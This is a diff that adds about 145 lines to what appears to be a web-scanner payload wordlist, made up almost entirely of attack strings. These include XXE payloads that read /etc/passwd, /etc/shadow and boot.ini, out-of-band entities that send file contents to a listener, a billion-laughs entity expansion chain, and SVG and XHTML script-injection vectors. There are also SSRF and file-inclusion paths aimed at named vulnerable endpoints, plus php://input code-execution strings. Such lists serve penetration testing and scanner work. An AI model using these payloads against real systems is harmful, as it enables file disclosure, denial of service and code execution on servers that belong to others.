@@ -1,5 +1,149 @@
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><!doctype foo [<!element foo any><!entity xxe system ""file:////dev/random"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><!doctype foo [<!element foo any><!entity xxe system ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><!doctype foo [<!element foo any><!entity xxe system ""file:////etc/shadow"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""iso-8859-1""?><!doctype foo [<!element foo any><!entity xxe system ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
+"><!doctype x[<!entity x system "http://127.0.0.1:3555/xss_serve_payloads/x.html">]><y>&x;</y>
+"><!entity x "&#x3c;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3e;">
+"><script src="file:///c:/wonderful.js"></script><"
+'><!doctype x[<!entity x system "http://127.0.0.1:3555/xss_serve_payloads/x.html">]><y>&x;</y>
+'><!entity x "&#x3c;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3e;">
+/api/geojson?url=file:///etc/passwd
+/file:///etc/passwd
+/getcorsfile?urlpath=file:///etc/passwd
+/html?url=file:///etc/passwd
+/index.php?mod=textviewer&src=file:///etc/passwd
+/index.php?q=file:///etc/passwd
+/pictureproxy.php?url=file:///etc/passwd
+/portal/attachment_downloadbyurlatt.action?filepath=file:///etc/passwd
+/reports/rwservlet?report=test.rdf&desformat=html&destype=cache&jobtype=rwurl&urlparameter=file:///
+/rp?wsrp-url=file:///c:\\windows\\win.ini
+/rp?wsrp-url=file:///etc/passwd
+/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
+<!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!entity % param3 "<!entity &#x25; exfil system 'ftp://127.0.0.1:21/%data3;'>">
+<!entity % xxe system "php://filter/convert.base64-encode/resource=/etc/passwd" >
+<!entity ha1 "&ha0;&ha0;" >
+<!entity ha10 "&ha9;&ha9;" >
+<!entity ha11 "&ha10;&ha10;" >
+<!entity ha12 "&ha11;&ha11;" >
+<!entity ha13 "&ha12;&ha12;" >
+<!entity ha14 "&ha13;&ha13;" >
+<!entity ha15 "&ha14;&ha14;" >
+<!entity ha16 "&ha15;&ha15;" >
+<!entity ha17 "&ha16;&ha16;" >
+<!entity ha18 "&ha17;&ha17;" >
+<!entity ha19 "&ha18;&ha18;" >
+<!entity ha2 "&ha1;&ha1;" >
+<!entity ha20 "&ha19;&ha19;" >
+<!entity ha21 "&ha20;&ha20;" >
+<!entity ha22 "&ha21;&ha21;" >
+<!entity ha23 "&ha22;&ha22;" >
+<!entity ha24 "&ha23;&ha23;" >
+<!entity ha25 "&ha24;&ha24;" >
+<!entity ha26 "&ha25;&ha25;" >
+<!entity ha27 "&ha26;&ha26;" >
+<!entity ha28 "&ha27;&ha27;" >
+<!entity ha29 "&ha28;&ha28;" >
+<!entity ha3 "&ha2;&ha2;" >
+<!entity ha30 "&ha29;&ha29;" >
+<!entity ha4 "&ha3;&ha3;" >
+<!entity ha5 "&ha4;&ha4;" >
+<!entity ha6 "&ha5;&ha5;" >
+<!entity ha7 "&ha6;&ha6;" >
+<!entity ha8 "&ha7;&ha7;" >
+<!entity ha9 "&ha8;&ha8;" >
+<!entity systementity system "robots.txt">
+<!entity x "&#x3c;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3e;">
+<?xml version="1.0" encoding="iso-8859-1"?> <!doctype foo [     <!element foo any >   <!entity xxe system "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?> <!doctype foo [     <!element foo any >   <!entity xxe system "https://crowdshield.com/.testing/rfi.txt" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?> <!doctype foo [     <!element foo any >  <!entity xxe system "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?> <!doctype foo [     <!element foo any >  <!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [ <!element foo any ><!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [ <!element foo any><!entity xxe system "file:///etc/passwd"> ]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any >   <!entity xxe system "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/issue" >]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/issue" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo><?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "http://example.com:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "http://example:443" >]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xee system "file:///dev/random">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xee system "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xee system "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xee system "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:///dev/random">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "http://sn1persecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "http://xerosecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "https://crowdshield.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype xxe [<!entity foo "aaaaaa">]>
+<?xml version="1.0" encoding="iso-8859-1"?><!doctype xxe [<!entity foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="utf-8"?><!doctype doc [<!element test any ><!entity xxe system "php://filter/read-convert.base64-encode/resource=file:///c:/boot.ini" >]><doc><test>contents of file: &xxe;</test></doc>
+<?xml version="1.0" encoding="utf-8"?><!doctype doc [<!element test any ><!entity xxe system "php://filter/read-convert.base64-encode/resource=file:///c:/htdocs/wordpress/wp-config.php" >]><doc><test>contents of file: &xxe;</test></doc>
+<?xml version="1.0" standalone="no"?><!doctype svg public "-//w3c//dtd svg 1.1//en" "http://www.w3.org/graphics/svg/1.1/dtd/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg><a href="javascript:123">&#1;</a>
+<?xml version="1.0" standalone="no"?><!doctype svg public "-//w3c//dtd svg 1.1//en" "http://www.w3.org/graphics/svg/1.1/dtd/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg><svg xmlns="http://www.w3.org/2000/svg"><onload=confirm(1)> xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+<?xml version="1.0" standalone="yes"?><!doctype ernw [ <!entity xxe system "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
+<?xml version="1.0" standalone="yes"?><!doctype ernw [ <!entity xxe system "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
+<?xml version="1.0"?> <!doctype change-log [ <!entity systementity system "../../../../boot.ini"> ]> <change-log> <text>&systementity;</text> </change-log>
+<?xml version="1.0"?> <!doctype change-log [ <!entity systementity system "../../../boot.ini" ]> <change-log> <text>&systementity;</text>; </change-log>
+<?xml version="1.0"?> <!doctype change-log [ <!entity systementity system "robots.txt"> ]> <change-log> <text>&systementity;</text> </change-log>
+<?xml version="1.0"?> <!doctype change-log [ <!entity systementity system "robots.txt"> ]> <change-log> <text>&systementity;</text>; </change-log>
+<?xml version="1.0"?><!doctype change-log[ <!entity myentity "world"> ]><change-log><text>hello &myentity;</text></change-log>
+<?xml version="1.0"?><!doctype change-log[ <!entity myentity "world"><!entity myquote "&quot;"> ]><change-log><text>&myquote;hello &myentity;&myquote;</text></change-log>
+<?xml version='1.0' standalone='no'?><!doctype foo [<!entity % f5a30 system "https://crowdshield.com/.testing/rfi_vuln.txt">%f5a30; ]>
+<?xml-stylesheet type="text/css"?><!doctype x system "test.dtd"><x>&x;</x>
+<a href="file:///applications/calculator.app"><svg onload="this.parentnose.click()"></a>
+<div id="64"><!doctype x[<!entity x system "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
+<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">x</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!doctype x system "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onload" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
+<link rel=attachment href="file:///etc/passwd">
+<meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
+<soap:body><foo><![cdata[<!doctype doc [<!entity % dtd system "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:body>
+<xi:include href="file:///etc/fstab" parse="text"/>
+<xml version="1.0"?><!doctype xxe [<!element methodname any ><!entity xxe system "../../../../../../../etc/passwd">]><methodcall><methodname>&xxe</methodname></methodcall>
+<xml version="1.0"?><!doctype xxe [<!element methodname any ><!entity xxe system "http://sn1persecurity.com/.testing/rfi_vuln.txt">]><methodcall><methodname>&xxe</methodname></methodcall>
+<xml version="1.0"?><!doctype xxe [<!element methodname any ><!entity xxe system "http://xerosecurity.com/.testing/rfi_vuln.txt">]><methodcall><methodname>&xxe</methodname></methodcall>
+<xml version="1.0"?><!doctype xxe [<!element methodname any ><!entity xxe system "https://crowdshield.com/.testing/rfi_vuln.txt">]><methodcall><methodname>&xxe</methodname></methodcall>
+?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input http/1.1
+api/geojson?url=file:///etc/passwd
+cart/extras/curltest.php?url=file:///hostmarker:portmaker/passwd
+concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
 expect://id
+extras/curltest.php?url=file:///hostmarker:portmaker/passwd
+file:///
 file:///c:/windows/win.ini
+file:///etc/group
 file:///etc/hosts
+file:///etc/network/interfaces
+file:///etc/os-release
 file:///etc/passwd
+file:///etc/resolv.conf
+file:///etc/sysconfig/network
 file:///proc/self/environ
+file:///proc/version
+file:///var/www/html/.htaccess
+filter/jmol/js/jsmol/php/jsmol.php?call=getrawdatafromdatabase&query=file:///etc/passwd
+getcorsfile?urlpath=file:///c://windows/win.ini
+getcorsfile?urlpath=file:///etc/passwd
+php://input
+php://input%00 -c '<?php echo "pwned"; ?>'
+php://input%00 -c '<?php phpinfo(); ?>'
+php://input;base64,smjhdhk4y1dibfjhemh6q3lqqtw%2fcghwigvjag8gj1z1bg5lcmfibgunoya%2fpkpiyxr5ognxsgxsyxpoekn5ake%3d
+php://input;base64,smjhdhk4y1dibfjhemh6q3lqqtw%2fcghwigvjag8gj1z1bg5lcmfibgunoya%2fpkpiyxr5ognxsgxsyxpoekn5ake=
+portal/attachment_downloadbyurlatt.action?filepath=file:///etc/passwd
+reports/rwservlet?report=test.rdf&desformat=html&destype=cache&jobtype=rwurl&urlparameter=file:///
+ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/shells
+wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
+xhtml entity hijacking [<!entity nbsp "'">]  by @masa141421356
+zxrjl3noywrvdyuwma==php://input
